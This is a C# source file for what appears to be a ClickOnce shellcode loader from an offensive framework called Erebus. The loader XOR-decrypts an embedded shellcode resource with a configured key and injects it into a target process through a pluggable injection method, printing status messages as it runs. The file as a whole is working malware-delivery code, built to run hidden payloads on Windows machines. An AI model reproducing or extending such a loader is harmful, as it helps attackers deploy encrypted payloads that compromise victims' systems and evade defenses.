using Erebus.ClickOnce;
using System;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Text;

namespace ShellcodeLoader
{
    public class ClickOnceLoader
    {
        [STAThread]
        [SupportedOSPlatform("windows")]
        public static void Main(string[] args)
        {
            // Load configuration
            string injectionMethod = InjectionConfig.InjectionMethod;
            int targetPid = InjectionConfig.TargetPID;
            byte[] key = InjectionConfig.EncryptionKey;

            DebugLogger.WriteLine($"[*] Injection Method: {injectionMethod}");
            if (targetPid > 0)
                DebugLogger.WriteLine($"[*] Target PID: {targetPid}");

            // Decrypt shellcode
            byte[] shellcode = ErebusRsrc.erebus_bin;

            if (key.Length > 0)
            {
                DebugLogger.WriteLine("[+] Decrypting shellcode...");
                for (int i = 0; i < shellcode.Length; i++)
                    shellcode[i] = (byte)(shellcode[i] ^ key[i % key.Length]);
            }

            DebugLogger.WriteLine($"[+] Shellcode size: {shellcode.Length} bytes");

            // Execute injection
            try
            {
                IInjectionMethod injector = InjectionFactory.GetInjectionMethod(injectionMethod);
                DebugLogger.WriteLine($"[+] Using: {injector.Name}");
                DebugLogger.WriteLine($"[+] Description: {injector.Description}");
                DebugLogger.WriteLine("");

                bool success = injector.Inject(shellcode, targetPid);
                
                if (success)
                {
                    DebugLogger.WriteLine("\n[+] Injection completed successfully!");
                }
                else
                {
                    DebugLogger.WriteLine("\n[-] Injection failed!");
                    Environment.Exit(1);
                }
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"\n[-] Error: {ex.Message}");
                Environment.Exit(1);
            }
        }
    }
}
